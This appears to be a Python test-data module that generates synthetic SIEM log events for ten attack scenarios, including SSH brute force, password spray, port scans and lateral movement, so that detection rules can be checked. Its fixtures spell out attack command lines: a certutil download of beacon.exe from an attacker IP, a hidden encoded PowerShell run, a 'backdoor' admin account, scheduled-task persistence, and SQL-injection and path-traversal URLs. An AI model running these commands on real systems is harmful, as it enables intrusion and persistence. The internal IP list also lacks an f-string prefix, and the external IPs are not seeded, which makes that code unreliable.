"""Deterministic synthetic event generator for attack scenarios.

Generates ~20k events across all SIEM tables with embedded attack scenarios that
the builtin detection rules should detect. Works offline with no network access.

Attack scenarios (see docs/TESTDATA.md for details):
  1. SSH brute force -> success from same IP (Syslog/AuthEvents)
  2. Password spray across users (AuthEvents)
  3. Encoded PowerShell + certutil download (ProcessEvents)
  4. New admin user creation + scheduled task persistence (ProcessEvents/Syslog)
  5. Port scan (NetworkEvents)
  6. Web scanner: many 404s, sqlmap UA (WebAccess)
  7. DNS to rare/long DGA-like domains (NetworkEvents)
  8. Lateral movement RDP/SMB (NetworkEvents)
  9. Syslog noise with occasional auth failures (Syslog)
  10. Windows logon events blended in (AuthEvents)

Performance target: >= 5k events/sec through pipeline.
"""
from __future__ import annotations

import random
from datetime import UTC, datetime, timedelta

from ..db import Database
from ..ingest import IngestPipeline


def _utcnow() -> datetime:
    return datetime.now(UTC).replace(tzinfo=None)


# ── helpers ───────────────────────────────────────────────────────────────────

# Sample IP pools
_INTERNAL_IPS = [
    "10.0.1.{i}" for i in range(10, 50)
] + [
    "10.0.2.{i}" for i in range(10, 100)
]
_EXTERNAL_IPS = [
    f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    for _ in range(200)
]
_ATTACKER_IPS = ["45.33.32.156", "185.220.101.34", "198.51.100.42", "203.0.113.99"]
_USERS = ["alice", "bob", "charlie", "dave", "eve", "frank", "grace", "heidi",
          "ivan", "judy", "mike", "nancy", "oscar", "peggy", "root"]
_TARGET_USERS = _USERS[:-2]
_HOSTS = ["web01", "web02", "db01", "mail01", "dc01", "fs01"] + [f"workstation-{i}" for i in range(1, 20)]
_DOMAINS = ["example.com", "internal.corp", "saas.example.com"]
_DGA_DOMAINS = [
    "xn--8fth7ae0gra.com", "qlzmidf.ru", "hpbwpkox.biz", "rngvemq.net",
    "tbjyglsuw.org", "xcfdgalzm.info", "kjuvbfnrei.net", "mowlyqxf.ru",
]
_PROCESSES = [
    "powershell.exe", "cmd.exe", "certutil.exe", "net.exe", "net1.exe",
    "schtasks.exe", "mstsc.exe", "wmic.exe", "rundll32.exe", "mshta.exe",
    "reg.exe", "sc.exe", "bitsadmin.exe", "svchost.exe", "explorer.exe",
]
_PARENT_PROCESSES = [
    "winword.exe", "excel.exe", "outlook.exe", "wscript.exe", "java.exe",
    "chrome.exe", "firefox.exe", "svchost.exe", "explorer.exe",
]
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/17.2",
    "curl/7.88.1",
]
_WEB_SCANNER_UAS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nmap Scripting Engine",
    "Nikto/2.5.0",
    "masscan/1.3",
]
_WEB_URLS = [
    "/index.html", "/login", "/api/users", "/search?q=hello", "/images/logo.png",
    "/css/style.css", "/js/app.js", "/admin", "/api/config", "/download/file.pdf",
]
_WEB_SCAN_URLS = [
    "/admin/login.php", "/wp-admin/", "/.env", "/config.php.bak",
    "/api/v1/users?id=1' OR '1'='1", "/cgi-bin/../../../etc/passwd",
    "/phpmyadmin/", "/actuator/health", "/.git/config",
]
_PORTS_COMMON = [22, 80, 443, 53, 445, 3389, 1433, 3306, 8080, 8443]
_PORTS_SWEEP = [22, 80, 443, 3389, 445, 1433, 3306, 5432, 6379, 8080, 8443]


def _random_sample(pool, rng):
    return pool[rng.randint(0, len(pool) - 1)]


def _make_syslog_msg(ts, host, app, msg):
    """RFC 3164 syslog format."""
    mmm = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
           "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"][ts.month - 1]
    return f"<{13}> {mmm} {ts.day:2d} {ts.hour:02d}:{ts.minute:02d}:{ts.second:02d} {host} {app}: {msg}"


# ── scenario generators ──────────────────────────────────────────────────────

def _gen_ssh_brute(db, rng, start_ts, count=200):
    """Scenario 1: SSH brute force from attacker IP, then success.

    Emits two views of the same attack:
      - raw sshd syslog lines (Syslog table), and
      - normalized AuthEvents rows (AuthMethod='ssh') via windows_json 4624/4625,
        which is the table the SSH brute-force rules query.
    """
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-syslog"
    attacker = "45.33.32.156"
    target = "web01"
    records = []
    auth_records = []
    t = start_ts

    def _auth_evt(ts, user, success):
        return {
            "EventID": 4624 if success else 4625,
            "TimeCreated": ts.isoformat(),
            "Computer": target,
            "event_data": {
                "TargetUserName": user,
                "IpAddress": attacker,
                "LogonType": "3",
                "AuthenticationPackageName": "ssh",
                "FailureReason": "" if success else "%%2313",
            },
        }

    # Many failures, occasional success near the end
    for i in range(count):
        t += timedelta(seconds=rng.randint(1, 5))
        is_success = i >= count - 5 and rng.random() < 0.25
        user = "root" if is_success else _random_sample(["root", "admin", "pi", "ubuntu", "oracle"], rng)
        if is_success:
            msg = f"Accepted password for {user} from {attacker} port {rng.randint(40000,60000)} ssh2"
        else:
            msg = f"Failed password for {user} from {attacker} port {rng.randint(40000,60000)} ssh2"
        records.append(_make_syslog_msg(t, target, f"sshd[{rng.randint(1000,9999)}]", msg))
        auth_records.append(_auth_evt(t, user, is_success))

    # Deterministic tail burst: 12 rapid root failures then a success, so the
    # brute-force rules cross their thresholds regardless of RNG spread.
    for _ in range(12):
        t += timedelta(seconds=rng.randint(1, 2))
        records.append(_make_syslog_msg(t, target, f"sshd[{rng.randint(1000,9999)}]",
            f"Failed password for root from {attacker} port {rng.randint(40000,60000)} ssh2"))
        auth_records.append(_auth_evt(t, "root", False))
    t += timedelta(seconds=2)
    records.append(_make_syslog_msg(t, target, f"sshd[{rng.randint(1000,9999)}]",
        f"Accepted password for root from {attacker} port {rng.randint(40000,60000)} ssh2"))
    auth_records.append(_auth_evt(t, "root", True))

    pipeline.ingest(source_id, records)
    # Normalized view of the same attack for AuthEvents-based rules.
    pipeline.ingest("testdata-synth-auth", auth_records, parser="windows_json")

    # Also generate some normal SSH for baseline
    normal = []
    t += timedelta(seconds=30)
    for i in range(50):
        t += timedelta(minutes=rng.randint(1, 10))
        user = _random_sample(_USERS, rng)
        ip = _random_sample(_INTERNAL_IPS, rng)
        msg = f"Accepted publickey for {user} from {ip} port {rng.randint(50000,60000)} ssh2"
        normal.append(_make_syslog_msg(t, target, f"sshd[{rng.randint(1000,9999)}]", msg))
    pipeline.ingest(source_id, normal)

    return len(records) + len(normal) + len(auth_records)


def _gen_password_spray(db, rng, start_ts, count=150):
    """Scenario 2: Password spray - same password across many users from one IP."""
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-win"
    attacker = "185.220.101.34"
    t = start_ts

    records = []
    for i in range(count):
        t += timedelta(seconds=rng.randint(1, 3))
        user = _random_sample(_USERS + ["administrator", "backup", "service_account"], rng)
        evt = {
            "EventID": 4625,
            "TimeCreated": t.isoformat(),
            "Computer": "dc01",
            "event_data": {
                "TargetUserName": user,
                "IpAddress": attacker,
                "FailureReason": "%%2313",
                "LogonType": "3",
                "Status": "0xC000006A",
            },
        }
        records.append(evt)

    pipeline.ingest(source_id, records, parser="windows_json")
    return len(records)


def _gen_powershell_certutil(db, rng, start_ts):
    """Scenario 3: Encoded PowerShell download + certutil download cradle."""
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-sysmon"
    t = start_ts
    host = "workstation-7"
    user = "alice"
    records = []

    # Office app spawns PowerShell with encoded command
    t += timedelta(seconds=5)
    records.append({
        "EventID": 1,
        "TimeCreated": t.isoformat(),
        "Computer": host,
        "User": f"CORP\\{user}",
        "event_data": {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc "
                           "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "ParentCommandLine": r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /dde',
            "User": f"CORP\\{user}",
        },
    })

    # certutil.exe download
    t += timedelta(seconds=30)
    records.append({
        "EventID": 1,
        "TimeCreated": t.isoformat(),
        "Computer": host,
        "User": f"CORP\\{user}",
        "event_data": {
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -urlcache -split -f "
                           "http://45.33.32.156:8080/beacon.exe C:\\Users\\alice\\AppData\\Local\\Temp\\update.exe",
            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ParentCommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc ...",
            "User": f"CORP\\{user}",
        },
    })

    pipeline.ingest(source_id, records, parser="windows_json")
    return len(records)


def _gen_new_admin_user(db, rng, start_ts):
    """Scenario 4: New admin user creation + scheduled task persistence."""
    pipeline = IngestPipeline(db)
    t = start_ts
    host = "workstation-7"

    # sudo useradd (syslog; the sudo sub-parser turns it into an AuthEvents row)
    t += timedelta(seconds=60)
    syslog_records = [_make_syslog_msg(t, host, "sudo",
        "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/useradd -m -G sudo,adm backdoor")]

    win_records = []
    # net localgroup administrators /add (Sysmon 1 → ProcessEvents)
    t += timedelta(seconds=5)
    win_records.append({
        "EventID": 1,
        "TimeCreated": t.isoformat(),
        "Computer": host,
        "event_data": {
            "Image": "C:\\Windows\\System32\\net1.exe",
            "CommandLine": "net localgroup administrators backdoor /add",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "User": "CORP\\alice",
        },
    })
    # schtasks create persistence (Sysmon 1 → ProcessEvents)
    t += timedelta(seconds=10)
    win_records.append({
        "EventID": 1,
        "TimeCreated": t.isoformat(),
        "Computer": host,
        "event_data": {
            "Image": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": "schtasks /create /tn \"WindowsUpdate\" /tr "
                           "\"C:\\Users\\alice\\AppData\\Local\\Temp\\update.exe\" /sc daily /st 09:00 /f",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "User": "CORP\\alice",
        },
    })

    pipeline.ingest("testdata-synth-syslog", syslog_records)
    pipeline.ingest("testdata-synth-sysmon", win_records, parser="windows_json")
    return len(syslog_records) + len(win_records)


def _gen_port_scan(db, rng, start_ts):
    """Scenario 5: Port scan from external IP across internal hosts."""
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-net"
    attacker = "203.0.113.99"
    t = start_ts
    records = []
    targets = ["web01", "web02", "db01", "mail01", "dc01", "fs01"]
    target_ips = ["10.0.1.10", "10.0.1.11", "10.0.2.10", "10.0.1.20", "10.0.1.5", "10.0.1.30"]
    # 60 distinct ports per host: crosses the port-scan rule threshold
    # (>=50 distinct DstPort per SrcIp within the window).
    ports = list(range(20, 80))

    for target, dst_ip in zip(targets, target_ips):
        for port in ports:
            t += timedelta(milliseconds=rng.randint(10, 200))
            records.append({
                "EventID": 3,
                "TimeCreated": t.isoformat(),
                "Computer": target,
                "event_data": {
                    "SourceIp": attacker,
                    "DestinationIp": dst_ip,
                    "SourcePort": str(rng.randint(40000, 60000)),
                    "DestinationPort": str(port),
                    "Protocol": "tcp",
                    "Image": "System",
                },
            })

    pipeline.ingest(source_id, records, parser="windows_json")
    return len(records)


def _gen_web_scanner(db, rng, start_ts, count=300):
    """Scenario 6: Web scanner - many 404s, sqlmap User-Agent."""
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-web"
    attacker_ip = "198.51.100.42"
    t = start_ts
    records = []

    # Normal traffic baseline
    for i in range(200):
        t += timedelta(seconds=rng.randint(1, 10))
        ip = _random_sample(_INTERNAL_IPS + [f"10.0.3.{rng.randint(1,100)}"], rng)
        url = _random_sample(_WEB_URLS, rng)
        ua = _random_sample(_USER_AGENTS, rng)
        status = 200 if rng.random() < 0.85 else rng.choice([301, 304, 403, 500])
        records.append(
            f'{ip} - {_random_sample(_USERS, rng)} [{_apache_ts(t)}] '
            f'"GET {url} HTTP/1.1" {status} {rng.randint(100, 50000)} '
            f'"{"http://example.com" if rng.random()<0.3 else "-"}" "{ua}"'
        )

    # Scanner traffic (many 404s, scanning paths)
    for i in range(count):
        t += timedelta(milliseconds=rng.randint(50, 500))
        ua = _random_sample(_WEB_SCANNER_UAS, rng) if rng.random() < 0.6 else _random_sample(_USER_AGENTS, rng)
        url = _random_sample(_WEB_SCAN_URLS, rng)
        status = 404 if rng.random() < 0.5 else rng.choice([200, 403, 500])
        records.append(
            f'{attacker_ip} - - [{_apache_ts(t)}] '
            f'"GET {url} HTTP/1.1" {status} {rng.randint(100, 5000)} '
            f'"-"' f'"{ua}"'
        )

    pipeline.ingest(source_id, records)
    return len(records)


def _gen_dga_dns(db, rng, start_ts, count=60):
    """Scenario 7: DNS to rare/long DGA-like domains."""
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-dns"
    t = start_ts
    records = []
    infected = "10.0.1.25"

    # Normal DNS
    for i in range(30):
        t += timedelta(seconds=rng.randint(10, 120))
        domain = _random_sample(_DOMAINS, rng)
        records.append({
            "query": domain,
            "id.orig_h": _random_sample(_INTERNAL_IPS, rng),
            "id.resp_h": "10.0.1.1",
            "ts": t.timestamp(),
        })

    # DGA-like: many queries to long/rare domains
    for i in range(count):
        t += timedelta(seconds=rng.randint(1, 10))
        domain = _random_sample(_DGA_DOMAINS, rng)
        dga = f"{_random_string(rng, 8, 14)}.{_random_sample(['xyz','top','ml','tk','ga'], rng)}"
        domain = dga if rng.random() < 0.7 else domain
        records.append({
            "query": domain,
            "id.orig_h": infected,
            "id.resp_h": "8.8.8.8",
            "ts": t.timestamp(),
        })

    pipeline.ingest(source_id, records, parser="zeek_dns")
    return len(records)


def _gen_lateral_movement(db, rng, start_ts):
    """Scenario 8: Lateral movement - RDP/SMB connections from compromised host."""
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-net"
    enslaved = "10.0.1.25"  # Same as DGA-infected
    t = start_ts
    records = []

    targets = [("10.0.1.10", "web01"), ("10.0.1.11", "web02"),
               ("10.0.2.10", "db01"), ("10.0.1.5", "dc01")]

    for dst_ip, dst_host in targets:
        # RDP connection
        t += timedelta(seconds=rng.randint(5, 30))
        records.append({
            "EventID": 4624,
            "TimeCreated": t.isoformat(),
            "Computer": dst_host,
            "event_data": {
                "TargetUserName": "administrator",
                "IpAddress": enslaved,
                "LogonType": "10",  # RemoteInteractive
                "AuthenticationPackageName": "Negotiate",
            },
        })

        # SMB connection (Sysmon 3 on the compromised host)
        t += timedelta(milliseconds=500)
        records.append({
            "EventID": 3,
            "TimeCreated": t.isoformat(),
            "Computer": "workstation-7",
            "event_data": {
                "SourceIp": enslaved,
                "DestinationIp": dst_ip,
                "DestinationPort": "445",
                "Protocol": "tcp",
                "Image": "System",
            },
        })

    pipeline.ingest(source_id, records, parser="windows_json")
    return len(records)


def _gen_syslog_noise(db, rng, start_ts, count=500):
    """Background syslog noise with occasional auth failures."""
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-syslog"
    t = start_ts
    records = []

    apps = ["cron", "rsyslogd", "systemd", "kernel", "auditd"]
    messages = [
        "session opened for user {user} by (uid=0)",
        "pam_unix(cron:session): session closed for user {user}",
        "Received signal 15, shutting down",
        "resumed normal operation after reload",
        "SELinux is preventing /usr/sbin/httpd from write access on the file /var/www/html/index.html",
        "Firewall: DROP IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC={src} DST={dst} PROTO=TCP SPT={sport} DPT={dport}",
    ]

    for i in range(count):
        t += timedelta(seconds=rng.randint(1, 30))
        host = _random_sample(_HOSTS, rng)
        app = _random_sample(apps, rng)
        msg_template = _random_sample(messages, rng)
        msg = msg_template.format(
            user=_random_sample(_USERS, rng),
            src=_random_sample(_EXTERNAL_IPS[:50], rng),
            dst=_random_sample(_INTERNAL_IPS, rng),
            sport=rng.randint(30000, 60000),
            dport=rng.randint(1, 65535),
        )
        records.append(_make_syslog_msg(t, host, app, msg))

    pipeline.ingest(source_id, records)
    return len(records)


def _gen_windows_baseline(db, rng, start_ts, count=150):
    """Normal Windows event baseline."""
    pipeline = IngestPipeline(db)
    source_id = "testdata-synth-win"
    t = start_ts
    records = []

    for i in range(count):
        t += timedelta(seconds=rng.randint(30, 300))
        host = _random_sample(["dc01", "fs01"] + [f"workstation-{i}" for i in range(1, 10)], rng)
        user = _random_sample(_USERS + ["administrator", "SYSTEM"], rng)

        records.append({
            "EventID": 4624,
            "TimeCreated": t.isoformat(),
            "Computer": host,
            "event_data": {
                "TargetUserName": user,
                "IpAddress": _random_sample(_INTERNAL_IPS, rng),
                "LogonType": str(rng.choice([2, 3, 5, 7])),
                "AuthenticationPackageName": "Negotiate",
            },
        })

    pipeline.ingest(source_id, records, parser="windows_json")
    return len(records)


# ── helpers ──────────────────────────────────────────────────────────────────

def _apache_ts(dt):
    mmm = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
           "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"][dt.month - 1]
    return f"{dt.day:02d}/{mmm}/{dt.year}:{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d} +0000"


def _random_string(rng, min_len=5, max_len=12):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    length = rng.randint(min_len, max_len)
    return "".join(rng.choice(chars) for _ in range(length))


# ── main generator ────────────────────────────────────────────────────────────

def generate_all(db: Database, seed: int = 42) -> dict:
    """Generate all synthetic attack scenarios and return per-scenario counts."""
    rng = random.Random(seed)
    base_ts = _utcnow() - timedelta(hours=24)

    scenarios = [
        ("ssh_brute", _gen_ssh_brute, base_ts),
        ("password_spray", _gen_password_spray, base_ts + timedelta(hours=2)),
        ("powershell_certutil", _gen_powershell_certutil, base_ts + timedelta(hours=3)),
        ("new_admin_schedtask", _gen_new_admin_user, base_ts + timedelta(hours=4)),
        ("port_scan", _gen_port_scan, base_ts + timedelta(hours=5)),
        ("web_scanner", _gen_web_scanner, base_ts + timedelta(hours=6)),
        ("dga_dns", _gen_dga_dns, base_ts + timedelta(hours=7)),
        ("lateral_movement", _gen_lateral_movement, base_ts + timedelta(hours=8)),
        ("syslog_noise", _gen_syslog_noise, base_ts + timedelta(hours=1)),
        ("windows_baseline", _gen_windows_baseline, base_ts + timedelta(hours=2)),
    ]

    results = {}
    total = 0
    for name, gen_fn, ts in scenarios:
        count = gen_fn(db, rng, ts)
        results[name] = count
        total += count

    results["total"] = total
    return results
